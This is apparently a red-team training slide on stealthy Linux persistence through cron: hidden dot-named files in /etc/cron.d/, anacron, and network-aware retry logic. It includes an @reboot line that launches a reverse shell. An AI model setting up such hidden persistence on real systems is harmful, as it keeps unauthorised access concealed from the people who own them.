Linux Persistence

Beyond Basic crontab

Reliable and hidden cron jobs for long-term access.

Enhancing cron Reliability

  • Network Connectivity Checks: Embed logic to verify network is up before payload execution.
  • Error Handling: Add retry mechanisms or logging to ensure successful execution.
  • Conditional Execution: Use `if` statements to check for specific conditions before running.
Key Takeaway

Advanced cron techniques focus on reliability through network checks and stealth through hidden files or anacron, making persistence more robust.

Stealthy cron Implementations

Hidden cron Files
  • Place job files in /etc/cron.d/.
  • Use a dot in the filename (e.g., .hiddenjob).
  • Less visible during casual directory listings.
anacron for Intermittent Systems
  • Ensures jobs run even if system was off.
  • Ideal for laptops or non-24/7 servers.
  • Jobs are executed when system powers on.

Example: Network-Aware cron Job

@reboot /bin/bash -c "sleep 60 && while ! ping -c 1 google.com; do sleep 5; done && /tmp/revshell"

This job waits 60 seconds, then continuously pings google.com until network is up, before launching /tmp/revshell.
